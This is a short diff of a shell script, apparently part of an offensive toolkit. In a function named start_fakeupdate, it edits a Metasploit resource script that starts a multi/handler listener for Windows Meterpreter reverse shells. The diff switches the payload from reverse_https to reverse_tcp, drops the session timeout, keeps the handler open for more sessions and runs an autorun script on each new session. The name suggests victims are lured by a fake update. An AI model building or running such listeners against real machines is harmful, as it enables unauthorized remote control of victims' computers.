@@ -84,11 +84,10 @@ function start_fakeupdate(){
 
   # Metasploit resource script
   echo -e "use exploit/multi/handler
-  set PAYLOAD windows/meterpreter/reverse_https
+  set PAYLOAD windows/meterpreter/reverse_tcp
   set EXITFUNC thread
   set LHOST 0.0.0.0
   set LPORT ${win_port}
-  set SessionCommunicationTimeout 0
   set ExitOnSession false
   set AutoRunScript \"\"
   set InitialAutorunScript multiscript -rc /tmp/autorun.rc
